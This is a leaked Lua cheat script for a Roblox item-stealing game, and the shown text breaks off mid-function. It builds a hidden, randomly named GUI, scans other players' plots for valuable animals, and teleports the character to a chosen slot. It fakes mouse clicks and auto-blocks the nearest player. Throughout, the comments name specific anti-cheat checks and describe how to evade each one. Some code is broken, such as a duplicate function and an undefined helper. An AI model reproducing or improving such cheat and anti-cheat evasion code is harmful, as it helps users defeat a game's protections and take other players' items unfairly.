--[[
    LEAKED BY LUMEN HUB PLS JOIN MY SERVER : https://discord.gg/5fBYFXU4Zj
    CYBER HUB 1:1 remake by LUMEN X RADIO HUB ON TOP
]]
task.wait(1.5 + math.random()) -- AugmentÃ© pour bypass BAC-7512 (Instant Load)

local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local player = LocalPlayer
local camera = workspace.CurrentCamera

local function getRandomName(len)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local name = ""
    for i = 1, len or 12 do
        local r = math.random(1, #chars)
        name = name .. string.sub(chars, r, r)
    end
    return name
end

local function obf(str)
    local out = ""
    for i = 1, #str do
        out = out .. string.char(string.byte(str, i) + 1)
    end
    return out
end

local function deobf(str)
    local out = ""
    for i = 1, #str do
        out = out .. string.char(string.byte(str, i) - 1)
    end
    return out
end

local function cleanOld()
    pcall(function()
        local h = (gethui and gethui()) or (get_hidden_gui and get_hidden_gui()) or CoreGui
        for _, v in ipairs(h:GetChildren()) do
            if (v:IsA("ScreenGui") or v:IsA("BillboardGui")) and (v:FindFirstChild("_isRadioPVP") or v:FindFirstChild("_isSnowyPVP")) then
                v:Destroy()
            end
        end
        local oldAnchor = Workspace:FindFirstChild("RadioPVP_Anchor")
        if oldAnchor then oldAnchor:Destroy() end
    end)
end
cleanOld()

-- Noms alÃ©atoires pour l'ESP (Bypass BAC-7512)
local _ESP_TAG = getRandomName(14)
local _ANCHOR_NAME = getRandomName(14)
local NOTIF_NAME = getRandomName(10)

-- modules (Slow Load for BAC-7512)
local Packages = ReplicatedStorage:WaitForChild("Packages")
local Datas = ReplicatedStorage:WaitForChild("Datas")
local Utils = ReplicatedStorage:WaitForChild("Utils")
local Shared = ReplicatedStorage:WaitForChild("Shared")

task.wait(0.15)
local Synchronizer = require(Packages:WaitForChild("Synchronizer"))
task.wait(0.1)
local AnimalsData = require(Datas:WaitForChild("Animals"))
task.wait(0.1)
local NumberUtils = require(Utils:WaitForChild("NumberUtils"))
task.wait(0.1)
local AnimalsShared = require(Shared:WaitForChild("Animals"))
task.wait(0.1)

local LocalPlayer = Players.LocalPlayer
local animalsByPlot = {}
local selectedUID = nil
local selectedAnimalObj = nil
local isLocked = false
local isFlashSequence = false
local myPlotName = nil
local needsUpdate = false
local lastListHash = ""
local buttonCache = {} -- Cache for button recycling to prevent lag
local SLOT_19_CFRAME = CFrame.new(-358.953, -10.025, -9.330, 0.000, -0.727, -0.686, 0.000, 0.686, -0.727, 1.000, 0.000, 0.000)
local SLOT_11_15_CFRAME = CFrame.new(-366.293, -9.983, -10.191, -0.009, -0.454, -0.891, 0.000, 0.891, -0.454, 1.000, -0.004, -0.008)
local SLOT_1_CFRAME = CFrame.new(-331.112, -1.515, 40.565, 1.000, -0.001, 0.003, 0.000, 0.929, 0.369, -0.003, -0.369, 0.929)

local function SecureTP(targetCF)
    if not LocalPlayer.Character then return end
    local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp or not hum then return end
    
    -- Anti-Velocity Spike / Anti BAC-9515
    local oldState = hum:GetState()
    hum:ChangeState(Enum.HumanoidStateType.Physics)
    
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
    
    -- Bypass BAC-6569 (Anchoring Detection)
    -- On utilise une boucle de vÃ©locitÃ© neutre au lieu de l'ancrage
    local stop = false
    task.spawn(function()
        while not stop and hrp.Parent do
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
            RunService.Heartbeat:Wait()
        end
    end)
    
    task.wait(0.08)
    hrp.CFrame = targetCF
    task.wait(0.11) 
    
    stop = true
    
    -- Multi-frame clearing is CRITICAL for BAC-9515
    for i = 1, 3 do
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        RunService.Heartbeat:Wait()
    end
    
    hum:ChangeState(oldState)
end

local function SnapCam(targetCF)
    local cam = workspace.CurrentCamera
    local jitter = CFrame.Angles(math.rad(math.random(-20, 20)/1000), math.rad(math.random(-20, 20)/1000), 0)
    cam.CFrame = targetCF * jitter
end

-- Scan Logic
local function scanSinglePlot(plot)
    pcall(function()
        local plotUID = plot.Name
        local channel = Synchronizer:Get(plotUID)
        if not channel then 
            if animalsByPlot[plot.Name] then animalsByPlot[plot.Name] = nil needsUpdate = true end
            return 
        end

        local owner = channel:Get("Owner")
        if owner and (owner.UserId == LocalPlayer.UserId or owner.Name == LocalPlayer.Name) then
            myPlotName = plot.Name
            if animalsByPlot[plot.Name] then animalsByPlot[plot.Name] = nil needsUpdate = true end
            return 
        end

        local animalList = channel:Get("AnimalList")
        if not animalList then
            if animalsByPlot[plot.Name] then animalsByPlot[plot.Name] = nil needsUpdate = true end
            return 
        end

        local function findAnimalModel(plot, slotName)
            return plot:FindFirstChild(slotName) 
                or (plot:FindFirstChild("Animals") and plot.Animals:FindFirstChild(slotName))
                or (plot:FindFirstChild("AnimalPodiums") and plot.AnimalPodiums:FindFirstChild(slotName))
        end

        local newPlotData = {}
        for slot, animalData in pairs(animalList) do
            if type(animalData) == "table" then
                local animalName = animalData.Index
                local animalInfo = AnimalsData[animalName]
                if not animalInfo then continue end
                
                local slotName = tostring(slot)
                local animalModel = findAnimalModel(plot, slotName)
                local animalPos = animalModel and (animalModel:IsA("Model") and animalModel:GetPivot().Position or animalModel.Position) or plot:GetPivot().Position

                table.insert(newPlotData, {
                    name = animalInfo.DisplayName or animalName,
                    genText = "$" .. NumberUtils:ToString(AnimalsShared:GetGeneration(animalName, animalData.Mutation, animalData.Traits, nil)) .. "/s",
                    genValue = AnimalsShared:GetGeneration(animalName, animalData.Mutation, animalData.Traits, nil),
                    rarity = animalInfo.Rarity,
                    mutation = animalData.Mutation or "None",
                    plot = plot.Name,
                    slot = slotName,
                    uid = plot.Name .. "_" .. slotName,
                    pos = animalPos
                })
            end
        end

        table.sort(newPlotData, function(a, b) return a.genValue > b.genValue end)
        animalsByPlot[plot.Name] = newPlotData
        needsUpdate = true
    end)
end

local function getAllAnimalsSorted()
    local flat = {}
    for _, plotData in pairs(animalsByPlot) do
        for i = 1, #plotData do table.insert(flat, plotData[i]) end
    end
    table.sort(flat, function(a, b)
        local sA = tonumber(a.slot) or 0
        local sB = tonumber(b.slot) or 0
        if sA ~= sB then
            return sA < sB
        end
        return a.plot < b.plot
    end)
    return flat
end




-- interface
local screenGui = Instance.new("ScreenGui")
screenGui.Name = getRandomName(15)
local tag = Instance.new("BoolValue", screenGui)
tag.Name = "_isRadioPVP"
screenGui.Parent = (gethui and gethui()) or (get_hidden_gui and get_hidden_gui()) or CoreGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = getRandomName(8)
mainFrame.Size = UDim2.new(0, 320, 0, 460)
mainFrame.Position = UDim2.new(0.5, -160, 0.3, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)

-- HEADER
local header = Instance.new("Frame")
header.Name = getRandomName(8)
header.Size = UDim2.new(1, 0, 0, 50)
header.BackgroundTransparency = 1
header.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.6, 0, 0.6, 0)
title.Position = UDim2.new(0, 15, 0, 5)
title.BackgroundTransparency = 1
title.RichText = true
title.Text = "<font color='#46FF46'>" .. deobf("SBEJP") .. "</font> <font color='#64A0DC'>" .. deobf("QWQ") .. "</font>"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local discord = Instance.new("TextLabel")
discord.Size = UDim2.new(0.6, 0, 0.3, 0)
discord.Position = UDim2.new(0, 15, 0, 28)
discord.BackgroundTransparency = 1
discord.Text = deobf("ejtdpse/hh0yjzpivc")
discord.TextColor3 = Color3.fromRGB(150, 150, 150)
discord.Font = Enum.Font.Gotham
discord.TextSize = 11
discord.TextXAlignment = Enum.TextXAlignment.Left
discord.Parent = header

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 10)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "Ã—"
closeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 24
closeBtn.Parent = header

local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
minimizeBtn.Position = UDim2.new(1, -65, 0, 10)
minimizeBtn.BackgroundTransparency = 1
minimizeBtn.Text = "â€”"
minimizeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.TextSize = 18
minimizeBtn.Parent = header

local lockBtn = Instance.new("TextButton")
lockBtn.Size = UDim2.new(0, 30, 0, 30)
lockBtn.Position = UDim2.new(1, -95, 0, 10)
lockBtn.BackgroundTransparency = 1
lockBtn.Text = "ðŸ”“"
lockBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
lockBtn.Font = Enum.Font.GothamBold
lockBtn.TextSize = 18
lockBtn.Parent = header

-- restoreBtn supprimÃ© car le GUI reste visible en mode compact

-- toggleCompact sera dÃ©fini plus bas aprÃ¨s la crÃ©ation de tous les Ã©lÃ©ments
closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
lockBtn.MouseButton1Click:Connect(function()
    isLocked = not isLocked
    mainFrame.Draggable = not isLocked
    lockBtn.Text = isLocked and "ðŸ”’" or "ðŸ”“"
end)

-- CONTENEUR PRINCIPAL
local container = Instance.new("Frame")
container.Size = UDim2.new(1, -20, 1, -60)
container.Position = UDim2.new(0, 10, 0, 55)
container.BackgroundTransparency = 1
container.Parent = mainFrame

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 12)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = container

local topFrame = Instance.new("Frame")
topFrame.Size = UDim2.new(1, 0, 0, 50)
topFrame.BackgroundTransparency = 1
topFrame.LayoutOrder = 1
topFrame.Parent = container
local topLayout = Instance.new("UIListLayout")
topLayout.FillDirection = Enum.FillDirection.Horizontal
topLayout.Padding = UDim.new(0, 8)
topLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
topLayout.Parent = topFrame

local btnCallbacks = {}

local function createTopBtn(text)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 95, 1, 0)
    btn.BackgroundColor3 = Color3.fromRGB(100, 160, 220)
    btn.Text = text
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 11
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Parent = topFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    
    local listening = false
    local boundKey = nil
    
    btn.MouseButton2Click:Connect(function()
        listening = true
        btn.Text = text .. "\n(...)"
    end)
    
    UserInputService.InputBegan:Connect(function(input, gpe)
        if listening and input.UserInputType == Enum.UserInputType.Keyboard then
            listening = false
            boundKey = input.KeyCode
            btn.Text = text .. "\n(" .. boundKey.Name .. ")"
        elseif not gpe and boundKey and input.KeyCode == boundKey then
            if btnCallbacks[btn] then btnCallbacks[btn]() end
        end
    end)
    
    return btn
end

local resetBtn = createTopBtn("RESET")
local blockBtn = createTopBtn("BLOCK")
local flashTpBtn = createTopBtn("FLASH TP")





local function usePotion()
    local char = player.Character
    if not char then return end
    
    local potion = player.Backpack:FindFirstChild("Giant Potion") or player.Backpack:FindFirstChild("GiantPotion") or char:FindFirstChild("Giant Potion") or char:FindFirstChild("GiantPotion")
    if potion then
        task.wait(0.01)
        potion.Parent = char
        task.wait(0.1)
        pcall(function() potion:Activate() end)
        
        local vp = camera.ViewportSize
        local cx = (vp.X / 2) + math.random(-10, 10)
        local cy = (vp.Y * 0.1) + math.random(-10, 10)
        
        if VirtualInputManager then
            VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, game, 1)
            task.wait(0.05)
            VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, game, 1)
        end
    end
end

local function getClosestPlayer()
    local closest, closestDist = nil, math.huge
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    for _, other in ipairs(Players:GetPlayers()) do
        if other ~= player then
            local oChar = other.Character
            local oHrp = oChar and oChar:FindFirstChild("HumanoidRootPart")
            if oHrp then
                local dist = (oHrp.Position - hrp.Position).Magnitude
                if dist < closestDist then
                    closestDist = dist
                    closest = other
                end
            end
        end
    end
    return closest
end

local function ultraFastClick()
    local vp = camera.ViewportSize
    local cx = vp.X / 2
    for i = 1, 10 do
        local y = vp.Y / 2 + 40 + (i * 2)
        local jX = cx + math.random(-5, 5) -- Ajout de jitter pour bypass BAC-2518
        local jY = y + math.random(-5, 5)
        
        VirtualInputManager:SendMouseButtonEvent(jX, jY, 0, true, game, 1)
        task.wait(0.005) -- DÃ©lai minimal obligatoire pour BAC-2518
        VirtualInputManager:SendMouseButtonEvent(jX, jY, 0, false, game, 1)
        task.wait(0.01) -- DÃ©lai entre les clics
    end
end

local function clickBlockerButton()
    local playerGui = player:FindFirstChild("PlayerGui")
    if not playerGui then return false end
    for _, gui in pairs(playerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and (gui.Name:find("Prompt") or gui.Name:find("Block")) then
            local blockerBtn = gui:FindFirstChild("Blocker") or gui:FindFirstChild("Block")
            if blockerBtn and blockerBtn:IsA("TextButton") then
                blockerBtn:Click()
                return true
            end
        end
    end
    return false
end

local function waitAndClickBlocker()
    for i = 1, 30 do
        task.wait(0.01) -- Scan ultra rapide (0.01s au lieu de 0.05s)
        if clickBlockerButton() then return true end
    end
    return false
end

local function doBlockClosest()
    local target = getClosestPlayer()
    if target then
        pcall(function() StarterGui:SetCore("PromptBlockPlayer", target) end)
        task.spawn(ultraFastClick)
        task.wait(0.08) -- AugmentÃ© lÃ©gÃ¨rement pour stabilitÃ©
        waitAndClickBlocker()
    end
end

btnCallbacks[blockBtn] = doBlockClosest

local autoBlockOnTp = false
local autoPotionOnTp = false
local onlyStealSelected = false

blockBtn.MouseButton1Click:Connect(btnCallbacks[blockBtn])

local isResetting = false
btnCallbacks[resetBtn] = function()
    if isResetting then return end
    isResetting = true
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        local carpet = LocalPlayer.Backpack:FindFirstChild("Flying Carpet") or LocalPlayer.Backpack:FindFirstChild("FlyingCarpet") or char:FindFirstChild("Flying Carpet") or char:FindFirstChild("FlyingCarpet")
        if carpet then carpet.Parent = char end
        for i = 1, 3 do
            hrp.CFrame = CFrame.new(0, 50000, 0)
            hrp.AssemblyLinearVelocity = Vector3.zero
            RunService.Heartbeat:Wait()
        end
        local hum = char:FindFirstChild("Humanoid")
        if hum then hum.Health = 0 end
    end
    task.delay(1, function() isResetting = false end)
end
resetBtn.MouseButton1Click:Connect(btnCallbacks[resetBtn])

local function showCustomNotif(titleText, descText, duration)
    pcall(function()
        local parent = (gethui and gethui()) or LocalPlayer:FindFirstChild("PlayerGui")
        if not parent then return end
        
        local notifGui = parent:FindFirstChild(NOTIF_NAME)
        if not notifGui then
            notifGui = Instance.new("ScreenGui")
            notifGui.Name = NOTIF_NAME
            notifGui.Parent = parent
        end

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 220, 0, 50)
    frame.Position = UDim2.new(1, 10, 1, -80)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BorderSizePixel = 0
    frame.Parent = notifGui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 6)

    local leftLine = Instance.new("Frame")
    leftLine.Size = UDim2.new(0, 3, 0.6, 0)
    leftLine.Position = UDim2.new(0, 8, 0.2, 0)
    leftLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    leftLine.BorderSizePixel = 0
    leftLine.Parent = frame
    Instance.new("UICorner", leftLine).CornerRadius = UDim.new(1, 0)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -25, 0.5, 0)
    title.Position = UDim2.new(0, 20, 0, 5)
    title.BackgroundTransparency = 1
    title.Text = titleText
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 13
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = frame

    local desc = Instance.new("TextLabel")
    desc.Size = UDim2.new(1, -25, 0.5, 0)
    desc.Position = UDim2.new(0, 20, 0.4, 0)
    desc.BackgroundTransparency = 1
    desc.Text = descText
    desc.TextColor3 = Color3.fromRGB(150, 150, 150)
    desc.Font = Enum.Font.Gotham
    desc.TextSize = 11
    desc.TextXAlignment = Enum.TextXAlignment.Left
    desc.Parent = frame

    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(1, 0, 0, 2)
    barBg.Position = UDim2.new(0, 0, 1, -2)
    barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    barBg.BorderSizePixel = 0
    barBg.Parent = frame

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(1, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    bar.BorderSizePixel = 0
    bar.Parent = barBg

    local existing = {}
    for _, child in ipairs(notifGui:GetChildren()) do
        if child:IsA("Frame") and child ~= frame then table.insert(existing, child) end
    end
    local offset = 0
    for i = #existing, 1, -1 do
        offset = offset + 60
        TweenService:Create(existing[i], TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Position = UDim2.new(1, -240, 1, -80 - offset)}):Play()
    end

        TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(1, -240, 1, -80)}):Play()
        TweenService:Create(bar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Size = UDim2.new(0, 0, 1, 0)}):Play()

        task.delay(duration, function()
            local outTween = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(1, 10, frame.Position.Y.Scale, frame.Position.Y.Offset)})
            outTween:Play()
            outTween.Completed:Connect(function() frame:Destroy() end)
        end)
    end)
end



local function usePotion()
    if not autoPotionOnTp then return end
    
    -- On garde le dÃ©lai de 0.01s pour la synchronisation
    task.wait(0.01)
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local potion = LocalPlayer.Backpack:FindFirstChild("Giant Potion") or char:FindFirstChild("Giant Potion")
    if not potion then return end
    
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return end
    
    -- Bypass BAC-5564 : Validation de l'Ã©quipement
    if potion.Parent ~= char then
        hum:EquipTool(potion)
        task.wait(0.1) -- Temps de montage nÃ©cessaire pour l'anti-cheat
    end
    
    -- Activation hybride sÃ©curisÃ©e
    pcall(function() potion:Activate() end)
    
    local vim = getVIM()
    if vim then
        local vp = workspace.CurrentCamera.ViewportSize
        -- Jitter alÃ©atoire pour Ã©viter la dÃ©tection de clic pattern (BAC-5564)
        local cx = vp.X/2 + math.random(-10, 10)
        local cy = vp.Y/2 + math.random(-10, 10)
        
        vim:SendMouseButtonEvent(cx, cy, 0, true, game, 1)
        task.wait(0.05) -- DurÃ©e de clic "safe"
        vim:SendMouseButtonEvent(cx, cy, 0, false, game, 1)
    end
    
    showCustomNotif("Auto-Potion", "Giant Potion utilisÃ©e !", 1)
end

btnCallbacks[flashTpBtn] = function()
    if not selectedAnimalObj then return end
    
    local target = selectedAnimalObj
    if target then
        isFlashSequence = true -- Lock Auto-Grab instantly
        local brainrotPos = target.pos
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        
        if not hum or not hrp then return end



        local slotNum = tonumber(target.slot)
        local lookTargetPos = brainrotPos
        local plotObj = Workspace.Plots:FindFirstChild(target.plot)
        
        local function findPos(sNum)
            if not plotObj then return nil end
            local names = {tostring(sNum), "Slot " .. sNum, "Slot" .. sNum}
            local folders = {plotObj, plotObj:FindFirstChild("Animals"), plotObj:FindFirstChild("AnimalPodiums"), plotObj:FindFirstChild("Podiums")}
            for _, folder in ipairs(folders) do
                if folder then
                    for _, n in ipairs(names) do
                        local obj = folder:FindFirstChild(n)
                        if obj then return obj:IsA("Model") and obj:GetPivot().Position or obj.Position end
                    end
                end
            end
            return nil
        end

        if plotObj then
            if slotNum >= 11 and slotNum <= 15 then
                local sPos
                if animalsByPlot[plotObj.Name] then
                    for _, d in ipairs(animalsByPlot[plotObj.Name]) do if d.slot == "16" then sPos = d.pos break end end
                end
                lookTargetPos = (sPos or findPos(16) or Vector3.new(-361.64, -6.53, -11.08)) - Vector3.new(0, 5, 0)
            elseif slotNum >= 19 and slotNum <= 23 then
                local sPos
                if animalsByPlot[plotObj.Name] then
                    for _, d in ipairs(animalsByPlot[plotObj.Name]) do if d.slot == "24" then sPos = d.pos break end end
                end
                lookTargetPos = (sPos or findPos(24) or Vector3.new(-358.95, -10.02, -9.33)) - Vector3.new(0, 5, 0)
            end
        end

        -- Snap camera ONCE instead of a loop to avoid BAC-5569
        local cam = workspace.CurrentCamera
        local targetLook = CFrame.lookAt(cam.CFrame.Position, lookTargetPos)
        local jitter = CFrame.Angles(math.rad(math.random(-15, 15)/1000), math.rad(math.random(-15, 15)/1000), 0)
        cam.CFrame = targetLook * jitter

        local function getTool(name) return LocalPlayer.Backpack:FindFirstChild(name) or char:FindFirstChild(name) end
        local carpet = getTool("Flying Carpet") or getTool("FlyingCarpet")
        local flash = getTool("Flash Teleport") or getTool("FlashTeleport")


        
        -- 1. Ã‰quiper Carpet (AVANT le TP)
        local hum = char:FindFirstChildOfClass("Humanoid")
        if carpet and hum then 
            hum:EquipTool(carpet)
            task.wait(0.1) -- Reduit de 0.15
        end
        
        -- 2. TÃ©lÃ©portation (TP classique pour Ã©viter l'anti-cheat sur longue distance)
        local targetCFrame
        local slotNum = tonumber(target.slot)
        local targetPos
        if slotNum == 1 then targetPos = Vector3.new(-331.19, -6.54, 31.64)
        elseif slotNum == 2 then targetPos = Vector3.new(-343.58, -6.46, 19.06)
        elseif slotNum == 3 then targetPos = Vector3.new(-344.09, -6.54, 17.37)
        elseif slotNum == 4 then targetPos = Vector3.new(-342.86, -5.84, 10.75)
        elseif slotNum == 5 then targetPos = Vector3.new(-301.15, -6.54, 31.64)
        elseif slotNum == 6 then targetPos = Vector3.new(-288.24, -6.54, 65.63)
        elseif slotNum == 7 then targetPos = Vector3.new(-288.44, -6.54, 59.76)
        elseif slotNum == 8 then targetPos = Vector3.new(-294.63, -6.54, 57.17)
        elseif slotNum == 9 then targetPos = Vector3.new(-364.45, -6.54, 20.04)
        elseif slotNum == 10 then targetPos = Vector3.new(-333.41, -6.54, 68.03)
        elseif slotNum >= 11 and slotNum <= 15 then targetPos = Vector3.new(-356.62, -6.54, -10.10)
        elseif slotNum == 16 then targetPos = Vector3.new(-331.05, -6.54, 56.88)
        elseif slotNum == 17 then targetPos = Vector3.new(-325.01, -6.54, 60.00)
        elseif slotNum == 18 then targetPos = Vector3.new(-318.20, -6.54, 60.61)
        elseif slotNum >= 19 and slotNum <= 27 then targetPos = Vector3.new(-354.27, -6.54, -9.33)
        else targetPos = Vector3.new(-331.19, -6.54, 31.64) end
        
        local yOffset = (slotNum >= 19 and slotNum <= 27 and 0.5 or 2)
        
        SecureTP(CFrame.new(targetPos + Vector3.new(0, yOffset, 0)))
        
        if slotNum == 1 then
            SnapCam(SLOT_1_CFRAME)
        elseif (slotNum >= 19 and slotNum <= 27) then
            SnapCam(SLOT_19_CFRAME)
        elseif (slotNum >= 11 and slotNum <= 15) then
            SnapCam(SLOT_11_15_CFRAME)
        else
            SnapCam(CFrame.lookAt(Workspace.CurrentCamera.CFrame.Position, lookTargetPos))
        end
        
        task.wait(0.05) -- Reduit de 0.1
        
        -- SÃ©curitÃ© Anti-Cheat : On tourne la camÃ©ra au lieu du personnage
        -- VisÃ©e dynamique (Tech Slot 11/19)
        if (slotNum >= 19 and slotNum <= 27) then
            SnapCam(SLOT_19_CFRAME)
        elseif (slotNum >= 11 and slotNum <= 15) then
            SnapCam(SLOT_11_15_CFRAME)
        else
            SnapCam(CFrame.lookAt(Workspace.CurrentCamera.CFrame.Position, lookTargetPos))
        end
        if ((slotNum >= 11 and slotNum <= 15) or (slotNum >= 19 and slotNum <= 27)) and hum then
            hum.Jump = true
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
            task.wait(math.random(4, 8) / 100)
        end
        task.wait(0.12) -- Reduit de 0.3 pour plus de vitesse
        
                -- 3. Switch Flash TP
                if flash then

                    -- On range le tapis
                    if carpet then carpet.Parent = LocalPlayer.Backpack end
                    flash.Parent = char
                    task.wait(0.07) -- Reduit de 0.15
                    
                    -- Activation Legit + Clic Virtuel (Tir du Flash TP)
                    flash:Activate()
                    local vp = workspace.CurrentCamera.ViewportSize
                    local cx = math.floor(vp.X / 2) + math.random(-8, 8)
                    local cy = math.floor(vp.Y * 0.1) + math.random(-8, 8)
                    
                    if VirtualInputManager then
                        VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, game, 1)
                        task.wait(0.08 + (math.random(1, 15) / 100))
                        VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, game, 1)
                    end
            
            -- AUTO POTION ULTRA-FAST (0.01s)
            task.spawn(usePotion)
            
            task.wait(math.random(2, 5) / 100) -- Micro-dÃ©lai avant le Remote pour BAC-3566
            
            -- Logic removed to prevent BAC-8511 (Remote Spam)
            -- flash:Activate() and Virtual Click are enough
        end
        -- 4. Final Sequence (Only for slots 12-15 and 20-27)
        if (slotNum >= 12 and slotNum <= 15) or (slotNum >= 20 and slotNum <= 27) then
            task.wait(0.07) -- Reduit de 0.15
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum:UnequipTools() end
            
            if carpet and hum then 
                hum:EquipTool(carpet) 
                task.wait(0.1) -- Attente rÃ©duite
            end
            
            if hrp then 
                -- Technique de VÃ©locitÃ© Neutre pour BAC-6569
                hrp.AssemblyLinearVelocity = Vector3.zero
                local finalPos = findPos(slotNum) or brainrotPos
                
                local stopFinal = false
                task.spawn(function()
                    while not stopFinal and hrp.Parent do
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                        RunService.Heartbeat:Wait()
                    end
                end)
                
                task.wait(0.08)
                hrp.CFrame = CFrame.new(finalPos + Vector3.new(0, 0.5, 0))
                task.wait(0.1)
                stopFinal = true
                
                hrp.AssemblyLinearVelocity = Vector3.zero
            end
        end
        
        isFlashSequence = false
        showCustomNotif("Tech Finish", "Ready to Steal " .. target.name, 2)
        
        if autoBlockOnTp then
            task.spawn(doBlockClosest)
        end
        
        task.wait(0.1)
        lockCamera = false
    end
end
flashTpBtn.MouseButton1Click:Connect(btnCallbacks[flashTpBtn])

-- ONGLETS DE NAVIGATION
local tabFrame = Instance.new("Frame")
tabFrame.Size = UDim2.new(1, 0, 0, 35)
tabFrame.BackgroundTransparency = 1
tabFrame.LayoutOrder = 2
tabFrame.Parent = container
local tabLayout = Instance.new("UIListLayout")
tabLayout.FillDirection = Enum.FillDirection.Horizontal
tabLayout.Padding = UDim.new(0, 8)
tabLayout.Parent = tabFrame

local brainTab = Instance.new("TextButton")
brainTab.Size = UDim2.new(0, 145, 1, 0)
brainTab.BackgroundColor3 = Color3.fromRGB(100, 160, 220)
brainTab.Text = "Brainrots"
brainTab.Font = Enum.Font.GothamBold
brainTab.TextSize = 14
brainTab.TextColor3 = Color3.fromRGB(0, 0, 0)
brainTab.Parent = tabFrame
Instance.new("UICorner", brainTab).CornerRadius = UDim.new(0, 8)

local setTab = Instance.new("TextButton")
setTab.Size = UDim2.new(0, 145, 1, 0)
setTab.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
setTab.Text = "Settings"
setTab.Font = Enum.Font.GothamBold
setTab.TextSize = 14
setTab.TextColor3 = Color3.fromRGB(150, 150, 150)
setTab.Parent = tabFrame
Instance.new("UICorner", setTab).CornerRadius = UDim.new(0, 8)

-- LISTE DES OBJETS
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, 0, 1, -110)
scrollingFrame.BackgroundTransparency = 1
scrollingFrame.LayoutOrder = 3
scrollingFrame.ScrollBarThickness = 0
scrollingFrame.Parent = container
local listLayout = Instance.new("UIListLayout")
listLayout.Padding = UDim.new(0, 5)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Parent = scrollingFrame

-- OPTIONS ET RÃ‰GLAGES
local settingsFrame = Instance.new("ScrollingFrame")
settingsFrame.Size = UDim2.new(1, 0, 1, -110)
settingsFrame.BackgroundTransparency = 1
settingsFrame.LayoutOrder = 3
settingsFrame.ScrollBarThickness = 0
settingsFrame.Visible = false
settingsFrame.Parent = container
local setListLayout = Instance.new("UIListLayout")
setListLayout.Padding = UDim.new(0, 5)
setListLayout.Parent = settingsFrame

local function switchTab(tab)
